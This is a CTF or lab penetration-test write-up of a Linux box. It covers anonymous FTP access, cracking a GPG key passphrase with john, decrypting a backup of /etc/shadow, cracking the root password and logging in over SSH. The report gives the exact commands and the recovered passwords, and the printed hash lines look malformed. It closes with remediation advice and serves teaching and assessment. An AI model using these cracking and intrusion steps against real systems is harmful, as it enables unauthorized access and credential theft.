## Executive Summary

A penetration test was conducted against the target host to identify security weaknesses. The assessment resulted in a full system compromise, culminating in root-level access.

The primary attack vector was a misconfigured FTP service allowing anonymous access to sensitive files. This exposure enabled retrieval of encrypted backups and private keys, which were subsequently cracked due to weak passphrase protection. The decrypted data contained password hashes, allowing offline cracking and eventual root access via SSH.

### Key Findings:

- Anonymous FTP access exposing sensitive system files
- Weak encryption passphrase protecting private key material
- Exposure of `/etc/shadow` backup
- Weak root password susceptible to dictionary attack

### Overall Risk: Critical


# Reconnaissance
Initial reconnaissance identified that no web services were running on standard ports (80/443). This suggested the attack surface was limited to non-web services.

# Scanning & Enumeration

### Nmap

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxr-xr-x    2 0        0            4096 Aug 11  2019 bin
| drwxr-xr-x    3 0        0            4096 Aug 11  2019 boot
| drwxr-xr-x   17 0        0            3700 Apr 01 11:53 dev
| drwxr-xr-x   85 0        0            4096 Aug 13  2019 etc
| drwxr-xr-x    3 0        0            4096 Aug 11  2019 home
| lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img -> boot/initrd.img-4.4.0-157-generic
| lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img.old -> boot/initrd.img-4.4.0-142-generic
| drwxr-xr-x   19 0        0            4096 Aug 11  2019 lib
| drwxr-xr-x    2 0        0            4096 Aug 11  2019 lib64
| drwx------    2 0        0           16384 Aug 11  2019 lost+found
| drwxr-xr-x    4 0        0            4096 Aug 11  2019 media
| drwxr-xr-x    2 0        0            4096 Feb 26  2019 mnt
| drwxrwxrwx    2 1000     1000         4096 Aug 11  2019 notread [NSE: writeable]
| drwxr-xr-x    2 0        0            4096 Aug 11  2019 opt
| dr-xr-xr-x   93 0        0               0 Apr 01 11:53 proc
| drwx------    3 0        0            4096 Aug 11  2019 root
| drwxr-xr-x   18 0        0             540 Apr 01 11:53 run
| drwxr-xr-x    2 0        0           12288 Aug 11  2019 sbin
| drwxr-xr-x    3 0        0            4096 Aug 11  2019 srv
| dr-xr-xr-x   13 0        0               0 Apr 01 11:53 sys
|_Only 20 shown. Use --script-args ftp-anon.maxlist=-1 to see all.
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.133.66
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8a:f9:48:3e:11:a1:aa:fc:b7:86:71:d0:2a:f6:24:e7 (RSA)
|   256 73:5d:de:9a:88:6e:64:7a:e1:87:ec:65:ae:11:93:e3 (ECDSA)
|_  256 56:f9:9f:24:f1:52:fc:16:b7:7b:a3:e2:4f:17:b4:ea (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

### Key Finding: Anonymous FTP Access

The FTP service allows anonymous login and exposes a large portion of the filesystem, including sensitive directories such as `/etc`, `/home`, and `/root`.

Additionally, a world-writable directory (`notread`) was identified.

#### Impact:

- Unauthorized access to sensitive files
- Potential credential exposure
- Increased attack surface for further exploitation

# Exploitation

### FTP Enumeration

Using anonymous FTP access, the following actions were possible:

- Navigated to `/home/melodias` and accessed user files
- Retrieved files from the `notread` directory:
    - `private.asc` (GPG private key)
    - `backup.pgp` (encrypted backup file)

### Decrypting the backup.pgp file:

```
gpg --import private.asc 
```

The key requires a password.  By converting it to a hash, `john` can be used to crack the `private.asc` file:

```
gpg2john private.asc > pgp.hash

john --wordlist=/usr/share/wordlists/rockyou.txt pgp.hash
```

The passphrase was identified as:

```
xbox360
```

#### Impact:

- Weak passphrase allowed compromise of encrypted data
- Demonstrates poor key management practices

### Decryption of backup.pgp

 With the password obtained, an attacker can then import the private key on their own attacking machine.
```
gpg --import private.asc
```

With the key successfuly imported, the `backup.pgp` can be decrypted.

```
gpg backup.pgp                             
gpg: WARNING: no command supplied.  Trying to guess what you mean ...
gpg: encrypted with elg512 key, ID AA6268D1E6612967, created 2019-08-12
      "anonforce <melodias@anonforce.nsa>"
gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
```

The first attempt was unsuccessful. Another attempt was made, but this time by force-enabling CAST5 instead:

```
gpg --cipher-algo CAST5 --decrypt backup.pgp
```

With that, the backup of an `/etc/shadow` file is revealed.

```
root:$607nYFaYfF4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0:18120:0:99999:7:::
daemon:*:17953:0:99999:7:::
bin:*:17953:0:99999:7:::
sys:*:17953:0:99999:7:::
sync:*:17953:0:99999:7:::
games:*:17953:0:99999:7:::
man:*:17953:0:99999:7:::
lp:*:17953:0:99999:7:::
mail:*:17953:0:99999:7:::
news:*:17953:0:99999:7:::
uucp:*:17953:0:99999:7:::
proxy:*:17953:0:99999:7:::
www-data:*:17953:0:99999:7:::
backup:*:17953:0:99999:7:::
list:*:17953:0:99999:7:::
irc:*:17953:0:99999:7:::
gnats:*:17953:0:99999:7:::
nobody:*:17953:0:99999:7:::
systemd-timesync:*:17953:0:99999:7:::
systemd-network:*:17953:0:99999:7:::
systemd-resolve:*:17953:0:99999:7:::
systemd-bus-proxy:*:17953:0:99999:7:::
syslog:*:17953:0:99999:7:::
_apt:*:17953:0:99999:7:::
messagebus:*:18120:0:99999:7:::
uuidd:*:18120:0:99999:7:::
melodias:1xDhc6S6G$IQHUW5ZtMkBQ5pUMjEQtL1:18120:0:99999:7:::
sshd:*:18120:0:99999:7:::
ftp:*:18120:0:99999:7:::   
```

#### Impact:

- Exposure of password hashes for all system users
- Enables offline password cracking

# Privilege Escalation 

By this stage, an attacker has access to the hashed passwords of both `melodias` and `root`.

**root:**
```
$607nYFaYfF4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0
```

**melodias:**
```
1xDhc6S6G$IQHUW5ZtMkBQ5pUMjEQtL1:18120:0:99999:7:::
```

The `/etc/shadow` entry below was pasted into a .txt file:
```
root:$607nYFaYfF4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0:18120:0:99999:7::: 
```

And the hash cracking tool `john` was used to crack the hashes password:
```
john --format=sha512crypt root.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

The password was recovered as:
```
hikari
```

### Root Access:

Using the recovered credentials, SSH access was obtained:

```
ssh root@10.10.10.10 
```

And root-level access was successfully achieved.

#### Impact

- Full system compromise
- Full control over all system resources
- Ability to modify, delete and exfiltrate data


## Findings & Recommendations

- **Anonymous FTP Access:** The FTP server allows anonymous login with access to sensitive directories, enabling attackers to download files and enumerate the system.  

    **Recommendation:** Disable anonymous FTP, restrict directory permissions, and enforce authentication controls.

- **Exposure of Sensitive Files:** Private keys and encrypted backups were accessible via FTP, leading to credential and system data exposure.  

    **Recommendation:** Remove sensitive files from public directories, enforce access controls, and monitor file access logs.

- **Weak GPG Passphrase:** The private key protecting the backup file used a weak, easily guessable passphrase, allowing attackers to decrypt sensitive data.  
    **Recommendation:** Use strong, high-entropy passphrases and consider hardware-backed key storage.

- **Weak Root Password:** The root password was vulnerable to dictionary attacks, enabling full system compromise.  

    **Recommendation:** Enforce strong password policies, disable root SSH login, and use key-based authentication.




